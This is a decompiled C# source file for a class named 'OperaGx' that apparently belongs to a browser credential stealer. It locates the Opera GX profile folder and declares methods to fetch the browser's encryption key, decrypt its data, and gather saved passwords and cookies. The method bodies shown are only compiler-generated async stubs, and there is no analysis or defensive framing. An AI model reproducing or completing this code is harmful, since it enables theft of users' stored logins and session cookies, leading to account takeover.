﻿using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace SHARP
{
	// Token: 0x02000026 RID: 38
	internal static class OperaGx
	{
		// Token: 0x060000D3 RID: 211 RVA: 0x00005638 File Offset: 0x00003838
		private static Task<byte[]> GetEncryptionKey()
		{
			OperaGx.<GetEncryptionKey>d__3 <GetEncryptionKey>d__;
			<GetEncryptionKey>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<GetEncryptionKey>d__.<>1__state = -1;
			<GetEncryptionKey>d__.<>t__builder.Start<OperaGx.<GetEncryptionKey>d__3>(ref <GetEncryptionKey>d__);
			return <GetEncryptionKey>d__.<>t__builder.Task;
		}

		// Token: 0x060000D4 RID: 212 RVA: 0x00005674 File Offset: 0x00003874
		private static Task<byte[]> DecryptData(byte[] buffer)
		{
			OperaGx.<DecryptData>d__4 <DecryptData>d__;
			<DecryptData>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<DecryptData>d__.buffer = buffer;
			<DecryptData>d__.<>1__state = -1;
			<DecryptData>d__.<>t__builder.Start<OperaGx.<DecryptData>d__4>(ref <DecryptData>d__);
			return <DecryptData>d__.<>t__builder.Task;
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x000056B8 File Offset: 0x000038B8
		internal static Task<PasswordFormat[]> GetPasswords()
		{
			OperaGx.<GetPasswords>d__5 <GetPasswords>d__;
			<GetPasswords>d__.<>t__builder = AsyncTaskMethodBuilder<PasswordFormat[]>.Create();
			<GetPasswords>d__.<>1__state = -1;
			<GetPasswords>d__.<>t__builder.Start<OperaGx.<GetPasswords>d__5>(ref <GetPasswords>d__);
			return <GetPasswords>d__.<>t__builder.Task;
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x000056F4 File Offset: 0x000038F4
		internal static Task<CookieFormat[]> GetCookies()
		{
			OperaGx.<GetCookies>d__6 <GetCookies>d__;
			<GetCookies>d__.<>t__builder = AsyncTaskMethodBuilder<CookieFormat[]>.Create();
			<GetCookies>d__.<>1__state = -1;
			<GetCookies>d__.<>t__builder.Start<OperaGx.<GetCookies>d__6>(ref <GetCookies>d__);
			return <GetCookies>d__.<>t__builder.Task;
		}

		// Token: 0x0400005D RID: 93
		private static readonly string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera GX Stable");

		// Token: 0x0400005E RID: 94
		private static byte[] _encryptionKey = null;
	}
}
